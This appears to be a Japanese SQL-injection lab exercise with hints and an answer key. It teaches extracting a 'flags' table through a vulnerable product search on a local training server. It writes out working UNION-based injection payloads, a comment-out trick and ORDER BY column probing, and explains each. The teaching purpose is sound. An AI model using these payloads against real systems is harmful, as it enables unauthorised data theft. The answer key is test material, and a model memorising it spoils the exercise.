# 03 - UNION-based Search

`http://localhost:3003` の商品検索から、DB内のflagを抜き出せ。
`server.py`のソースコードは読んでよい。

このDBのテーブル構成:
- `products(id, name, description, price)` — 検索対象、4カラム
- `flags(id, flag)` — 無関係の別テーブル。目標はこの`flag`を検索結果に混ぜ込むこと

## ヒント

<details><summary>ヒント1</summary>

まず普通に商品を検索しろ。`Widget`なら商品が見つかり、存在しない`zzz`なら「該当なし」に
なる。

次に`server.py`の`/search`エンドポイントを見ろ。`?q=`の値はどのSQLへ組み込まれている?

</details>

<details><summary>ヒント2</summary>

`q`は次のSQLの`...`へそのまま入る。

```sql
SELECT id, name, description, price FROM products
WHERE name LIKE '%...%'
```

`q`へ`'`を1つだけ送ってみろ。SQL構文エラーになれば、入力したクォートがSQLのクォートとして
解釈されている。

</details>

<details><summary>ヒント3</summary>

クォートを閉じた後は、サーバーが付ける末尾の`%'`が邪魔になる。次を送り、末尾をコメントに
できることを確認しろ。

```text
zzz'-- -
```

MySQLの`--`コメントは、直後に半角スペースが必要だ。最後の`-`は、そのスペースを見失わない
ための目印にすぎない。

</details>

<details><summary>ヒント4</summary>

別のSELECT結果を足すには`UNION SELECT`を使う。ただし、元のSELECTと同じ数の値を返す必要が
ある。検索結果は`id, name, description, price`の4カラムなので、まず固定値4つを混ぜてみろ。

```text
zzz' UNION SELECT 1,'test','union works',100-- -
```

`zzz`に一致する商品はないため、画面に出る1行は`UNION SELECT`で作ったものだ。

</details>

<details><summary>ヒント5</summary>

固定値を表示できたら、その一部を`flags`テーブルの値へ置き換える。`flags`は`id, flag`の
2カラムだが、UNION側も4つの値が必要だ。使わない位置は`NULL`で埋められる。

商品名の位置は、4つのうち何番目だったか?

</details>

<details><summary>解答</summary>

送るpayload(`q`パラメータ):
```
zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
```

これによりサーバー側で組み立てられる実際のSQLはこうなる:
```sql
SELECT id, name, description, price FROM products
WHERE name LIKE '%zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -%'
```

分解すると:
- `zzz` — 本来の検索語。適当な値でよく、存在しない商品名なので本来の検索結果は0件になる
- `'` — LIKE句のクォートを閉じる
- `UNION SELECT id,flag,NULL,NULL FROM flags` — `flags`テーブルの行を、`products`と同じ
  4カラムの形(id, name, description, price)に変形して結果に追加する。`id,flag`は型が
  合うのでそのまま、残り2カラムは`NULL`で埋める
- `-- -` — `--`はMySQLのコメント開始(直後に半角スペース必須)。これで末尾に残る`%'`を
  無効化している

結果、検索結果に`flags`テーブルの行が紛れ込み、`name`カラムの位置にflagが表示される。

### 発展: カラム数が明記されていない場合

カラム数(4)を教えられずに解く場合は`ORDER BY`で探る:
```
q=zzz' ORDER BY 4-- -   -> 通る
q=zzz' ORDER BY 5-- -   -> エラー(5カラム目は存在しない)
```
エラーになる手前の数字がSELECT対象のカラム数。

</details>
